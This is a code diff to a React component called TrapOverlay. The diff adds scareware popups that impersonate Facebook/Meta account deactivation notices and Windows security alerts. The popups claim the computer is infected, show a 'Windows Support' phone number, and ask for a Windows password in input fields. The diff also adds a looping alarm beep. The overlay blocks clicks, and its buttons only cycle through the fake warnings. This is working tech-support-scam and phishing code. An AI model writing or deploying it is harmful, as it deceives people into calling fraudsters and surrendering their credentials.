@@ -1,11 +1,121 @@
-import React, { useEffect, useState } from 'react';
+import React, { useEffect, useState, useRef } from 'react';
 import { X } from 'lucide-react';
 
 const TrapOverlay = () => {
   const [showOverlay, setShowOverlay] = useState(true);
   const [attempts, setAttempts] = useState(0);
+  const [currentPopupIndex, setCurrentPopupIndex] = useState(0);
+  const audioRef = useRef(null);
+  const audioContextRef = useRef(null);
+
+  // Multiple popup configurations
+  const popups = [
+    {
+      id: 'deactivated',
+      title: 'Account Temporarily Deactivated',
+      message: 'Meta has temporarily deactivated your account due to suspicious activity detected on your profile.',
+      submessage: 'For security reasons, we need to verify your identity before you can continue using Facebook.',
+      note: 'This is a standard security measure and your account will be restored once verification is complete.',
+      showProgress: true,
+      logo: 'facebook'
+    },
+    {
+      id: 'windows-security',
+      title: 'Windows Security Alert',
+      message: 'Windows has been blocked due to suspicious activity.',
+      submessage: 'Your computer has been infected with a virus. Please call Windows Support immediately.',
+      note: 'Error Code: 0x88820 - IP Detected: 95.122.68.19',
+      showProgress: false,
+      logo: 'windows'
+    },
+    {
+      id: 'admin-login',
+      title: 'Administrator Login Required',
+      message: 'Windows has been blocked due to suspicious activity.',
+      submessage: 'Try logging in again with your Windows account and password. If you need help, contact Windows Support.',
+      note: '020 4549 4912',
+      showProgress: false,
+      logo: 'windows',
+      showInputs: true
+    },
+    {
+      id: 'system-error',
+      title: 'Critical System Error',
+      message: 'Microsoft Defender found infected files but could not quarantine them due to Policy permissions.',
+      submessage: 'Please scan now to delete them manually or contact System Support for assistance.',
+      note: 'Your system is at risk. Immediate action required.',
+      showProgress: false,
+      logo: 'windows'
+    },
+    {
+      id: 'final-warning',
+      title: 'Final Security Warning',
+      message: 'Your account access has been suspended for violating our terms of service.',
+      submessage: 'To restore access, you must complete identity verification immediately.',
+      note: 'Failure to verify within 24 hours will result in permanent account deletion.',
+      showProgress: true,
+      logo: 'facebook'
+    }
+  ];
 
   useEffect(() => {
+    // Create continuous security warning audio using Web Audio API
+    const createSecurityAudio = () => {
+      try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        audioContextRef.current = new AudioContext();
+        
+        const playWarningSound = () => {
+          const ctx = audioContextRef.current;
+          
+          // Create oscillator for beep sound
+          const oscillator = ctx.createOscillator();
+          const gainNode = ctx.createGain();
+          
+          oscillator.connect(gainNode);
+          gainNode.connect(ctx.destination);
+          
+          // Set frequency for alarm-like sound
+          oscillator.frequency.setValueAtTime(800, ctx.currentTime);
+          oscillator.frequency.exponentialRampToValueAtTime(400, ctx.currentTime + 0.1);
+          
+          // Set volume
+          gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
+          gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+          
+          oscillator.start(ctx.currentTime);
+          oscillator.stop(ctx.currentTime + 0.3);
+        };
+
+        // Play sound continuously with intervals
+        const intervalId = setInterval(() => {
+          if (audioContextRef.current.state === 'suspended') {
+            audioContextRef.current.resume();
+          }
+          playWarningSound();
+          
+          // Double beep pattern
+          setTimeout(() => {
+            playWarningSound();
+          }, 400);
+        }, 2000);
+
+        audioRef.current = intervalId;
+
+        // Initial play after user interaction
+        document.addEventListener('click', () => {
+          if (audioContextRef.current.state === 'suspended') {
+            audioContextRef.current.resume();
+          }
+        }, { once: true });
+
+      } catch (error) {
+        console.error('Audio creation failed:', error);
+      }
+    };
+
+    createSecurityAudio();
+
     // Listen for trap restoration events
     const handleRestore = () => {
       setShowOverlay(true);
@@ -27,6 +137,14 @@ const TrapOverlay = () => {
     return () => {
       window.removeEventListener('restoreTrap', handleRestore);
       document.removeEventListener('click', preventClick, { capture: true });
+      
+      // Cleanup audio
+      if (audioRef.current) {
+        clearInterval(audioRef.current);
+      }
+      if (audioContextRef.current) {
+        audioContextRef.current.close();
+      }
     };
   }, [showOverlay]);
 
@@ -45,18 +163,28 @@ const TrapOverlay = () => {
   const handleAccept = (e) => {
     e.preventDefault();
     e.stopPropagation();
-    // Another trap - nothing happens
+    
+    // Close current popup and show next one
+    if (currentPopupIndex < popups.length - 1) {
+      setCurrentPopupIndex(prev => prev + 1);
+    } else {
+      // Loop back to first popup
+      setCurrentPopupIndex(0);
+    }
+    
     setAttempts(prev => prev + 1);
   };
 
   const handleIgnore = (e) => {
     e.preventDefault();
     e.stopPropagation();
-    // Another trap
+    // Another trap - just increment attempts
     setAttempts(prev => prev + 1);
   };
 
   if (!showOverlay) return null;
+
+  const currentPopup = popups[currentPopupIndex];
 
   return (
     <div 
